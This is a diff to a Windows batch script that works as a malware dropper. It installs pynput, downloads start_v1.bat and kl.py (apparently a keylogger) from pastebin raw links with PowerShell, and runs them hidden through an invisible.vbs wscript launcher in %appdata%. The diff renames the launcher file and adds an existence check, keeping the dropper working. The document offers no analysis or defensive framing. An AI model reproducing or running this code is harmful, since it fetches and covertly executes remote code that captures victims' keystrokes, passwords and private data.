@@ -2,9 +2,9 @@ echo off
 cls
 cd %appdata%
 
-if exist python\kl.py (
+if exist python\kl.py if exist python\start_v1.bat (
 	cd python
-	wscript.exe "%appdata%/invisible.vbs" "start.bat"
+	wscript.exe "%appdata%/invisible.vbs" "start_v1.bat"
 ) else (
 	mkdir python
 	cd python
@@ -18,7 +18,7 @@ if exist python\kl.py (
 	pip install pynput
 	cd %appdata%
 	cd python
-	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start.bat"
+	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start_v1.bat"
 	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
-	wscript.exe "%appdata%/invisible.vbs" "start.bat"
+	wscript.exe "%appdata%/invisible.vbs" "start_v1.bat"
 )
